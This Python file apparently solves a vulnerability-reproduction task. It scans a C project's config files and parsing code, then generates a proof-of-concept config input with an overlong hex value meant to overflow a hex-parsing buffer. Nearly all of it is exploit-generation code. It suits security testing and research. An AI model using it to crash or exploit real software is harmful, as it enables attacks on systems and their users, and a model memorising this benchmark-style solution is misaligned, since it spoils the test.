import os
import re
import tarfile
import tempfile
from collections import Counter
from typing import Optional, Tuple


def _is_within_directory(directory: str, target: str) -> bool:
    directory = os.path.abspath(directory)
    target = os.path.abspath(target)
    try:
        common = os.path.commonpath([directory, target])
    except Exception:
        return False
    return common == directory


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            continue
        try:
            tar.extract(member, path=path, set_attrs=False)
        except Exception:
            pass


def _maybe_project_root(extracted_dir: str) -> str:
    try:
        entries = [e for e in os.listdir(extracted_dir) if e and e not in (".", "..")]
    except Exception:
        return extracted_dir
    if len(entries) == 1:
        p = os.path.join(extracted_dir, entries[0])
        if os.path.isdir(p):
            return p
    return extracted_dir


def _read_text_file(path: str, max_bytes: int = 200_000) -> Optional[str]:
    try:
        st = os.stat(path)
        if st.st_size > max_bytes:
            return None
        with open(path, "rb") as f:
            data = f.read(max_bytes + 1)
    except Exception:
        return None
    if b"\x00" in data:
        return None
    try:
        return data.decode("utf-8", errors="ignore")
    except Exception:
        try:
            return data.decode("latin-1", errors="ignore")
        except Exception:
            return None


def _looks_like_key(s: str) -> bool:
    if not s or len(s) > 64:
        return False
    if s.startswith("%"):
        return False
    if any(ch.isspace() for ch in s):
        return False
    if "\\" in s or "/" in s:
        return False
    if any(ch in s for ch in "{}[]()"):
        return False
    return bool(re.fullmatch(r"[A-Za-z0-9_.:-]+", s))


def _strip_trailing_key_punct(s: str) -> str:
    while s and s[-1] in ("=", ":", " ", "\t"):
        s = s[:-1]
    return s


class Solution:
    def solve(self, src_path: str) -> bytes:
        temp_dir = None
        root = src_path
        if not os.path.isdir(src_path):
            temp_dir = tempfile.mkdtemp(prefix="poc_src_")
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    _safe_extract_tar(tar, temp_dir)
            except Exception:
                root = src_path
            else:
                root = _maybe_project_root(temp_dir)

        try:
            template = self._find_template_config(root)
            if template is not None:
                poc = self._build_from_template(template, root)
                return poc
            key, sep = self._infer_key_and_sep(root)
            if not key:
                key = "hex"
            if sep not in ("=", ":"):
                sep = "="
            return self._build_simple(key, sep)
        finally:
            if temp_dir:
                try:
                    for dirpath, dirnames, filenames in os.walk(temp_dir, topdown=False):
                        for fn in filenames:
                            try:
                                os.unlink(os.path.join(dirpath, fn))
                            except Exception:
                                pass
                        for dn in dirnames:
                            try:
                                os.rmdir(os.path.join(dirpath, dn))
                            except Exception:
                                pass
                    try:
                        os.rmdir(temp_dir)
                    except Exception:
                        pass
                except Exception:
                    pass

    def _long_hex(self, digits_len: int) -> str:
        if digits_len < 64:
            digits_len = 64
        if digits_len % 2 == 1:
            digits_len += 1
        return "0x" + ("A" * digits_len)

    def _build_simple(self, key: str, sep: str) -> bytes:
        key = _strip_trailing_key_punct(key)
        if not key:
            key = "hex"
        long_hex = self._long_hex(540)
        s = f"{key}{sep}{long_hex}\n"
        return s.encode("ascii", errors="ignore")

    def _find_template_config(self, root: str) -> Optional[str]:
        exts = {".conf", ".cfg", ".ini", ".cnf", ".config", ".txt", ".yaml", ".yml", ".json"}
        best_score = -10**9
        best_txt = None

        file_count = 0
        for dirpath, dirnames, filenames in os.walk(root):
            for fn in filenames:
                file_count += 1
                if file_count > 12000:
                    break
                low = fn.lower()
                _, ext = os.path.splitext(low)
                if ext not in exts and ("conf" not in low and "config" not in low and "cfg" not in low):
                    continue
                p = os.path.join(dirpath, fn)
                txt = _read_text_file(p)
                if not txt:
                    continue
                ltxt = txt.lower()
                score = 0
                if "0x" in ltxt:
                    score += 30
                if re.search(r"\b0x[0-9a-f]{8,}\b", ltxt):
                    score += 40
                if re.search(r"^\s*[A-Za-z0-9_.:-]+\s*[=:]", txt, flags=re.M):
                    score += 10
                if "hex" in ltxt:
                    score += 8
                if "config" in ltxt:
                    score += 2
                if re.search(r"^\s*\[.*\]\s*$", txt, flags=re.M):
                    score += 2
                size_penalty = min(len(txt), 200_000) // 200
                score -= size_penalty

                if score > best_score:
                    best_score = score
                    best_txt = txt
            if file_count > 12000:
                break

        if best_score < 20:
            return None
        return best_txt

    def _minify_keyval_config(self, txt: str) -> str:
        out_lines = []
        for line in txt.splitlines(True):
            s = line.lstrip()
            if not s:
                continue
            if s.startswith("#") or s.startswith(";"):
                continue
            if s.startswith("//"):
                continue
            if not s.strip():
                continue
            out_lines.append(line)
        return "".join(out_lines) if out_lines else txt

    def _build_from_template(self, template_txt: str, root: str) -> bytes:
        stripped = template_txt.lstrip()
        is_json_like = stripped.startswith("{") or stripped.startswith("[")
        if not is_json_like:
            template_txt2 = self._minify_keyval_config(template_txt)
        else:
            template_txt2 = template_txt

        m = re.search(r"0x[0-9A-Fa-f]{2,}", template_txt2)
        if m:
            long_hex = self._long_hex(540)
            out = template_txt2[:m.start()] + long_hex + template_txt2[m.end():]
            if not out.endswith("\n"):
                out += "\n"
            return out.encode("utf-8", errors="ignore")

        key, sep = self._infer_key_and_sep(root)
        if not key:
            key = "hex"
        if sep not in ("=", ":"):
            sep = "="

        long_hex = self._long_hex(540)
        if is_json_like:
            prop_key = key
            if not _looks_like_key(prop_key):
                prop_key = "hex"
            s = stripped
            if s.startswith("{"):
                out = f'{{"{prop_key}":"{long_hex}"}}\n'
            else:
                out = f'["{prop_key}", "{long_hex}"]\n'
            return out.encode("utf-8", errors="ignore")
        else:
            out = template_txt2
            if out and not out.endswith("\n"):
                out += "\n"
            out += f"{_strip_trailing_key_punct(key)}{sep}{long_hex}\n"
            return out.encode("utf-8", errors="ignore")

    def _infer_key_and_sep(self, root: str) -> Tuple[Optional[str], str]:
        key_counter = Counter()
        sep_counter = Counter()

        c_exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh"}
        file_count = 0

        parse_line_re = re.compile(r"\b(strtoul|strtoull|sscanf|scanf)\b")
        base16_re = re.compile(r"(,|\()\s*16\s*(\)|,)")
        fmt_hex_re = re.compile(r'"[^"]*%[0-9]*l*[xX][^"]*"')
        strcmp_re = re.compile(r'\b(strncmp|strcmp)\s*\(\s*[^,]+,\s*"([^"]+)"')
        strchr_eq_re = re.compile(r"strchr\s*\(\s*[^,]+,\s*'([=:])'\s*\)")
        find_eq_re = re.compile(r"'\s*([=:])\s*'")

        for dirpath, dirnames, filenames in os.walk(root):
            for fn in filenames:
                file_count += 1
                if file_count > 8000:
                    break
                _, ext = os.path.splitext(fn.lower())
                if ext not in c_exts:
                    continue
                p = os.path.join(dirpath, fn)
                txt = _read_text_file(p, max_bytes=500_000)
                if not txt:
                    continue

                for msep in strchr_eq_re.finditer(txt):
                    sep_counter[msep.group(1)] += 3

                if "fgets" in txt and ("=" in txt or ":" in txt):
                    for lit in re.finditer(r"'[=:]'", txt):
                        sep_counter[lit.group(0).strip("'")] += 1

                lines = txt.splitlines()
                hot = set()
                for i, line in enumerate(lines):
                    if not parse_line_re.search(line):
                        continue
                    if ("0x" in line) or base16_re.search(line) or fmt_hex_re.search(line) or ("hex" in line.lower()):
                        hot.add(i)

                if not hot:
                    continue

                for i in hot:
                    start = max(0, i - 25)
                    end = min(len(lines), i + 8)
                    for j in range(start, end):
                        lj = lines[j]
                        for ms in strcmp_re.finditer(lj):
                            s = ms.group(2)
                            s = _strip_trailing_key_punct(s)
                            if not _looks_like_key(s):
                                continue
                            score = 10
                            ls = s.lower()
                            if "hex" in ls:
                                score += 10
                            if "key" in ls:
                                score += 6
                            if "addr" in ls or "mask" in ls or "id" in ls:
                                score += 3
                            if len(s) <= 12:
                                score += 2
                            key_counter[s] += score
                        if ("=" in lj or ":" in lj) and ("config" in lj.lower() or "cfg" in lj.lower() or "conf" in lj.lower()):
                            for chm in find_eq_re.finditer(lj):
                                sep_counter[chm.group(1)] += 1
            if file_count > 8000:
                break

        sep = "="
        if sep_counter:
            sep = sep_counter.most_common(1)[0][0]
            if sep not in ("=", ":"):
                sep = "="

        key = None
        if key_counter:
            key = key_counter.most_common(1)[0][0]
        return key, sep